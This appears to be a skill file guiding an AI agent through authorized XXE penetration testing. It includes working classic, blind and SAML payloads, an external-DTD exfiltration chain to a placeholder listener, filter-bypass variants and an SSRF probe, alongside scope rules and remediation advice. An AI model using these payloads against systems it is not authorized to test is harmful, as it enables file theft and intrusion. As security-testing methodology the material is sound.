---
name: web-xxe
description: "XML external entity testing for a pentest-team engagement — finding XML sinks (XML on JSON endpoints, SVG/DOCX/XLSX/EPUB uploads, SOAP/XML-RPC, SAML), classic and blind (out-of-band) XXE, error-based exfil, parameter-entity DTD chains, XInclude, PHP-wrapper reads, filter/encoding bypass, and XXE-to-SSRF — with OOB callbacks pointed at a benign in-scope listener only. Load it when the appsec-triage input-validation sweep turns up an XXE lead on a claimed web/API target."
---

# XML External Entity Injection — under the engagement protocol

Deep methodology for the XXE class. You reach here from the `appsec-triage` input-validation sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Run these against a target you own on the board and that is on the `ROE.md` allowlist — every XML body, every upload.
- **Prove with a marker, not a dump.** Read one benign, non-sensitive file (`/etc/hostname`) or a planted marker to confirm entity resolution; do not exfiltrate `/etc/shadow`, SSH keys, or a credentials store to "demonstrate". No-real-data means the proof is the marker or a hash, not the file contents.
- **OOB exfil goes to a benign in-scope callback only.** Blind XXE, error-based, and parameter-entity chains must call *your own* in-scope collaborator/interactsh/HTTP listener — never a live external server, and never used to pull real cloud metadata credentials. Reaching `169.254.169.254` is proven by reaching a benign in-scope endpoint; crossing to real IAM creds is an incident.
- **Read before write; DoS and RCE are gated.** Billion-laughs / quadratic-blowup are availability-affecting — no-DoS in the ROE means you *describe* the vector, you do not fire it. `expect://`-style RCE and file writes are destructive/outward-facing — mark the surface blocked and route through the lead to the anchor for the human's explicit go.
- **Rate-limit yourself.** External-DTD fetches and upload chains can hammer a shared target and trip a WAF ban for the whole team. Throttle, and coordinate load on the board.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a reproduction another operator could re-run.

## Quick workflow

1. Find every point that submits XML — direct XML bodies, JSON/form endpoints coaxed into XML, file uploads, SOAP/SAML.
2. Decide classic vs blind: does the endpoint echo parsed XML back? If not, stand up your in-scope callback listener first.
3. Fire a benign probe to confirm the parser resolves external entities.
4. Confirm impact by reading `/etc/hostname` (benign) or a planted marker; escalate to SSRF-reachability if in scope.
5. File the finding with a clean reproduction and remediation.

## Finding XML sinks

- **Content-Type conversion** — flip `application/json` / `application/x-www-form-urlencoded` to `application/xml` (or `text/xml`) on endpoints that hint at an XML parser behind them.
- **File uploads** — SVG (profile pics, attachments); DOCX/XLSX/PPTX and EPUB (ZIP archives — unzip, inject into `word/document.xml`, `content.opf`, `META-INF/container.xml`, re-zip); PDF; RSS.
- **Legacy/integration** — SOAP `/soap` endpoints, XML-RPC, and SAML request/response and assertion flows (a prime target — see below).

## Detection (benign probes)

Classic — echoes the file back in the response:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>
```
Blind — confirm outbound to *your in-scope listener only*:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % xxe SYSTEM "http://<in-scope-listener>/probe"> %xxe; ]>
<root>test</root>
```
XInclude — when you cannot control the DOCTYPE:
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</root>
```
SVG upload probe:
```xml
<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>
```
SAML — inject a DOCTYPE into the `Issuer` / `AttributeValue`; test both AuthnRequest and Response, and pre-encryption in `EncryptedAssertion` where the SP decrypts then parses. Read `/etc/hostname` first — do not point SAML XXE at real identity secrets.

## Blind exfiltration (in-scope callback only, benign target file)

Host the external DTD on *your in-scope listener*, read a benign or planted file, exfil to the same listener:
```xml
<!-- in-scope external DTD (http://<in-scope-listener>/x.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<in-scope-listener>/?x=%file;'>">
%eval; %exfil;
```
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://<in-scope-listener>/x.dtd"> %dtd; ]>
<r>test</r>
```
Error-based (data lands in the parser error, no exfil endpoint needed) — same shape with `<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>`. PHP-wrapper read for source/config *when the file itself is non-sensitive or a planted marker*: `php://filter/convert.base64-encode/resource=<path>`. SOAP-wrapped blind XXE goes inside a CDATA section in the SOAP body.

Confirming resolution + one benign/marker read is the whole finding. Do not chain it into a real-secret harvest.

## XXE to SSRF (prove reachability, do not cross)

```xml
<!DOCTYPE t [ <!ENTITY xxe SYSTEM "http://<in-scope-internal-endpoint>:8080/status"> ]><x>&xxe;</x>
```
Demonstrate the parser makes server-side requests by hitting a **benign in-scope internal endpoint**. Cloud-metadata reachability is proven the same way — against an in-scope endpoint, never `169.254.169.254` for real IAM creds. Note that modern metadata (IMDSv2 token PUT, GCP `Metadata-Flavor`, Azure `Metadata: true`) usually can't be reached by header-less XXE anyway; record it as reachability and log the out-of-scope target to `FOLLOW-UPS.md`.

## Bypass techniques

- **Case variation** — `<!docTypE t [ <!ENTity xxe SYSTEM "file:///etc/hostname"> ]>`.
- **Protocol swap** — `file://`, `php://filter`, `jar://`, `netdoc://`, `gopher://` where a scheme is filtered.
- **URL encoding** — `file:%2F%2F%2Fetc%2Fhostname`.
- **CDATA / namespace wrapping** — smuggle the DOCTYPE inside CDATA or a namespaced XInclude to slip a naive filter.
- **Nested parameter entities** — the `%eval;`/`%exfil;` chain above already defeats many simple entity blocks.

Note the control that was present and what bypassed it — the client's XML-filter efficacy is itself reportable.

## Do NOT fire without the anchor's go

- **DoS** — billion-laughs / quadratic-blowup entity expansion is availability-affecting; describe it in the finding, don't run it under a no-DoS ROE.
- **RCE** — `expect://` and deserialization gadgets are destructive; gate through the anchor.
- **CI/CD & cloud-native sinks** — Jenkins/GitLab/GitHub XML artifact parsing, Kubernetes admission-webhook/ConfigMap XML, Maven `pom.xml` — powerful but easily out-of-scope and outward-facing; confirm they're on the allowlist and cleared before touching, otherwise log to `FOLLOW-UPS.md`.

## Remediation (for the finding)

1. **Fix** — disable DTD processing and external-entity resolution in the parser. Use hardened defaults/libraries: Python `defusedxml`; Java `disallow-doctype-decl=true` + external entities off + `setXIncludeAware(false)`; .NET `DtdProcessing.Prohibit` and `XmlResolver=null`; PHP `LIBXML_NONET` and disabled entity loading; libxml2 ≥ 2.13 `XML_PARSE_NO_XXE`.
2. **Defense in depth** — prefer JSON where feasible; network egress allowlist from XML-parsing hosts to kill blind-XXE callbacks; API-gateway XML threat protection (entity-expansion and external-entity limits, size/depth caps) at Kong/Apigee/AWS API Gateway; ModSecurity rules blocking `<!ENTITY` / `<!DOCTYPE ... [`.
3. **Detection** — log/SIEM rule on `<!DOCTYPE`/`<!ENTITY`/`SYSTEM` in request bodies and on outbound connections from a parsing host to an unexpected destination.

Write it up in the `appsec-reporting` finding format, CWE-611 / A05:2021 Security Misconfiguration, with the benign-marker reproduction.
